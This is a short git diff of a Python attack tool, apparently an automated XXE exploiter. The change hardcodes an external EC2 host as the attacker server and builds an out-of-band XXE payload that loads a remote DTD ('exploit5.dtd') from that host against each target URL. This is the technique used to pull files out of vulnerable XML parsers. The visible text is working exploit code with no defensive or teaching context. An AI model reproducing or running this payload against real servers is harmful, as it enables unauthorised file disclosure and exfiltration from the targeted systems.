@@ -63,12 +63,12 @@ def insertItem(item : schema , mongo):
 # return value : None
 
 # XXE Point
-def XXEPOINT(target_urls : list , mongo , attacker_server):
+def XXEPOINT(target_urls : list , mongo):
     genXxeAttack(target_urls , mongo)
 
     sendMsg(client_socket, "reset".encode())
 
-    oobXxeAttack(target_urls,  attacker_server)
+    oobXxeAttack(target_urls)
 
 
 
@@ -104,13 +104,14 @@ def genXxeAttack(target_urls : list , mongo):
 
 # routine : oob xxe exploit을 보냄
 # return value : None
-def oobXxeAttack(target_urls : list , attacker_server : str):
+def oobXxeAttack(target_urls : list ):
     global session
+    attacker_server = "http://ec2-54-180-116-84.ap-northeast-2.compute.amazonaws.com:1001/"
     headers = {'Content-Type': 'application/xml;charset=UTF-8',
                 'Accept': 'application/xml' }
 
     for target_url in target_urls:
-        url = '{}/url/{}'.format(attacker_server,target_url)
+        url = '{}url/{}'.format(attacker_server,target_url)
         requests.get(url)  
         # Crafting XXE Payload
         payload = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}exploit/exploit5.dtd"> %xxe; ]>'.format(attacker_server)
